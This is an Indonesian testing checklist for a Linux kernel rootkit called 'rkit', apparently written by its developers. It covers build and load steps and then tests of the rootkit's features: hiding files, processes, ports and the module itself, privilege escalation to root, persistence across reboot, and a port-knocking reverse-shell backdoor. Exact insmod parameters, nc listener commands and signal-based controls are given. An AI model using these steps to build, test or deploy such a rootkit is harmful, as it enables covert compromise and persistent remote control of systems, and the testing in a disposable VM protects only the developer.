# TESTING.md — checklist uji WAJIB sebelum status diubah

> Aturan utama: **tidak ada kode backend yang boleh naik status
> (🚧 -> 🧪 -> ✅) sebelum lolos checklist ini.**

##0. Prasyarat uji (sekali saja)

- [ ] VM disposable (VirtualBox/VMware) — **bukan server nyata**
- [ ] Snapshot bersih SEBELUM uji pertama
- [ ] Tahu cara akses **console VM** (kalau panic, shell remote mati)
- [ ] Catat versi kernel persis: `uname -r`
- [ ] Install prereq: `build-essential` + `linux-headers-$(uname -r)`

##1. Build

- [ ] `gcc`/`make` jalan, headers cocok (`/lib/modules/$(uname -r)/build` ada)
- [ ] `modinfo <modul>.ko | grep vermagic` cocok dengan `uname -r`
- [ ] Catat semua warning/error yang dipatch — **daftar patch = dokumen**

##2. Load (berhati-hatilah — tahap paling bahaya)

- [ ] Simpan snapshot dulu
- [ ] `insmod <modul>.ko` dari console VM (bukan SSH)
- [ ] Perhatikan `dmesg -w` saat load: oops/warning = **STOP, jangan lanjut**
- [ ] Kalau panic: reboot ke snapshot → catat penyebab → jangan ulangi pola itu
- [ ] Load sukses: catat apakah modul muncul di `lsmod` (fitur hide?)

##3. Fungsional (sesuai fitur yang diklaim)

- [ ] Hide file: buat file uji `bds_test` -> `ls` tak tampil -> path langsung tetap jalan
- [ ] Hide folder: `mkdir` uji -> hilang dari `ls` induknya (mekanisme sama, filter nama)
- [ ] Hide proses: (kalau ada) proses hilang dari `ps`
- [ ] Hide koneksi: `ss` vs `netstat` konsisten (atau tersembunyi sesuai desain)
- [ ] LPE (kalau ada): dari user biasa -> `id` = root
- [ ] Backdoor: uji dari mesin lain (knock/bot) — responsif & bisa di-unload
- [ ] **Kontrol & UNLOAD**: pastikan selalu ada jalan keluar:
      `rmmod <modul>` berhasil (atau ada perintah unhide -> rmmod)

##4. Persistence (kalau diklaim)

- [ ] Reboot VM -> modul hidup lagi dalam waktu yang dijanjikan
- [ ] Setelah `disable`/uninstall -> reboot -> modul TIDAK hidup lagi

##5. Setelah uji

- [ ] Unload / uninstall bersih
- [ ] Verifikasi: `lsmod`, `/proc/modules`, file, unit, cron = tidak ada sisa
- [ ] Update `KERNEL_COMPAT.md` dengan hasil (versi kernel + status + catatan patch)
- [ ] Simpan log uji sebagai bukti dokumentasi

## Template catatan hasil (isi untuk setiap kernel)

```
kernel        : <uname -r>
distro        : <ubuntu22.04 / rhel9 / ...>
build         : OK / FAIL (error: ...)
load          : OK / PANIC / OOPS
fitur teruji  : hide file (OK) / hide proc (...) / LPE (...)
unload        : OK / gagal (butuh reboot)
patch diperlukan: <daftar>
status        : 🚧 / 🧪 / ✅
tanggal       : <YYYY-MM-DD>
```

##6. Uji fitur v2 (conn-hide, self-hide, backdoor)

- [ ] **Hide port**: `nc -l <PORT>` di target → `netstat -tulpn` terlihat →
      `rkit hide port <PORT>` → `netstat` hilang → **catat** apakah `ss -tnlp`
      masih menampilkan (keterbatasan jujur, lihat DETECTION §6) → unhide
- [ ] **Self-hide**: `lsmod | grep rkit` terlihat → `rkit hide mod` →
      `lsmod` kosong → `rkit unhide mod` → muncul lagi → **barulah** `rmmod`
      ⚠️ kalau lupa unhide: rmmod gagal "not currently loaded" → perlu reboot
- [ ] **Backdoor**: unload → reload dengan
      `insmod rkit.ko backdoor_ip=<IP_kamu> backdoor_port=4444 knock_port=1337`
      → di mesin lokal: `nc -l4444` → knock `nc <IP_TARGET>1337` →
      shell masuk? → uji throttle (knock2x cepat = hanya1 shell)
- [ ] **State reboot**: `rkit hide file tes.txt` + `rkit hide port8080` →
      reboot → `rkit status` → daftar masih ada? (bukti rkit-load.sh jalan)
- [ ] **Backdoor mati default**: load TANPA `backdoor_ip` → knock1337 →
      TIDAK ada shell (harusnya nonaktif total)
- [ ] **Catatan backend legacy**: tidak punya `/proc/rkit` & CLI —
      kontrol via sinyal: `kill -s 64 1` (hide modul), `kill -s 62 1`
      (tampilkan modul), daftar hide via param `insmod ... hide=... hideport=...`
